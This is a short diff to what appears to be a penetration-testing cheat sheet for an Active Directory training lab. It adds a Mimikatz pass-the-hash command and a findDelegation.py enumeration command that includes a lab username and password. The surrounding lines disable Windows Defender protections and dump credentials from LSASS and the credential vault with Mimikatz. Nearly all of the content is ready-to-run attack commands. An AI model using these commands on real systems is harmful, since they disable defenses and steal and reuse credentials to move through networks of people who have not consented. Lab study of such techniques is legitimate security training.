@@ -129,6 +129,10 @@ Set-MpPreference -DisableArchiveScanning  $true
 Set-MpPreference -DisableIntrusionPreventionSystem  $true
 Set-MpPreference -DisableRealtimeMonitoring $true
 
+# PTH with Mimikatz
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell.exe"'
+
 # Mimikatz Dump LSASS
 
 Invoke-Mimikatz (basic)
@@ -137,6 +141,9 @@ Invoke-Mimikatz -Command '"sekurlsa::ekeys"' (to get AES keys)
 
 Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"' (credentials like those used for scheduled tasks are stored in the credential vault)
 
+# Enum Delegation
+
+python3 findDelegation.py dollarcorp.moneycorp.local/student202:t3dBtZYM4dWh5iKM -dc-ip 172.16.2.1
 
 # BloodHound
 
